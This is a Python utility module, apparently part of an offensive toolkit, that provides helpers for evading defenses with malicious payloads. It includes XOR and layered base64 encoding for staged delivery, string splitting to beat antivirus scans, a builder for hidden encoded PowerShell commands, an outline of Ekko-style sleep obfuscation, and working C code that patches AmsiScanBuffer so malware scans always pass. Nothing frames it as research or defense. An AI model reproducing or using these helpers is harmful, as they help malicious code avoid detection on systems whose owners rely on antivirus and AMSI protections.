# language: Python, file: utils/evasion.py
# obfuscation + anti-analysis helpers for payloads and scripts
import base64
import random
import string


def xor_encode(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)


def b64_stage(data: bytes) -> str:
    """multi-layer base64 for staged delivery"""
    layer = base64.b64encode(data)
    for _ in range(3):
        layer = base64.b64encode(layer)
    return layer.decode()


def string_obfuscate(s: str) -> str:
    """split string into concatenated chunks for AV string-scan evasion"""
    chunks = [s[i:i+3] for i in range(0, len(s), 3)]
    return " + ".join(f'"{c}"' for c in chunks)


def powershell_obfuscate(script: str) -> str:
    """base64-encode UTF-16LE powershell for -EncodedCommand"""
    encoded = base64.b64encode(script.encode("utf-16-le")).decode()
    return f"powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}"


def sleep_obfuscate_snippet() -> str:
    """C snippet — encrypted sleep to defeat sandbox timing"""
    return r'''
// Ekko-style sleep obfuscation — encrypts beacon in memory during sleep
void ekko_sleep(DWORD ms) {
    // 1. VirtualProtect RW
    // 2. encrypt image with RC4 key
    // 3. CreateTimerQueueTimer with WaitOrTimerCallback
    // 4. on wake: decrypt, restore RX
    // defeats memory scanners that poll during sleep windows
}
'''


def amsi_patch_snippet() -> str:
    """C snippet — patch AmsiScanBuffer to always return clean"""
    return r'''
// amsi.dll patch — AmsiScanBuffer → xor eax,eax; ret
#include <windows.h>
void patch_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;
    void* target = GetProcAddress(amsi, "AmsiScanBuffer");
    DWORD old;
    VirtualProtect(target, 3, PAGE_EXECUTE_READWRITE, &old);
    unsigned char patch[] = {0x31, 0xC0, 0xC3}; // xor eax,eax; ret
    memcpy(target, patch, 3);
    VirtualProtect(target, 3, old, &old);
}
'''
